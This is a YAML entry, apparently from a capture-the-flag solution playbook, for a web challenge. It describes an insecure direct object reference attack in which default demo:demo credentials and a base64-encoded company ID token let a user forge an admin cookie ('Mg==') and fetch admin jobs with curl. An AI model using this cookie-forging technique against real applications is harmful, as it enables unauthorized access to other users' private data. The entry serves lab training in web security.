name: idor_cookie_base64
category: web
tags: [idor, cookie, base64, broken_authorization, default_credentials]
indicators:
  - "Cookie stores user ID"
  - "Base64 encoded token"
  - "Default credentials demo:demo"
  - "Admin user has private resources"

tricks:
  - name: "Step 1: Identify default credentials"
    when: "Analyze source code"
    how: "Default account demo:demo exists"
    payload: |
      example_companies = [
          {"name": "demo", "password": "demo", "is_admin": False},
          {"name": "company2", "password": "...", "is_admin": True},
      ]

  - name: "Step 2: Analyze cookie generation"
    when: "Analyze authentication"
    how: "access_token is just base64 encoded company_id"
    payload: |
      def create_access_token(data: str):
          return base64.b64encode(data.encode()).decode()

  - name: "Step 3: Forge admin cookie"
    when: "Need to access admin resources"
    how: "Base64 encode company_id=2"
    payload: |
      import base64
      admin_id = 2
      fake_token = base64.b64encode(str(admin_id).encode()).decode()  # Mg==

  - name: "Step 4: Access private resources"
    when: "Execute IDOR"
    how: "Use forged cookie to access admin jobs"
    payload: |
      Cookie: access_token=Bearer Mg==

  - name: "Step 5: Extract the flag"
    when: "Execute attack"
    how: "Forge admin cookie and access /company/2/jobs"
    payload: |
      curl "http://TARGET/company/2/jobs" -H "Cookie: access_token=Bearer Mg=="

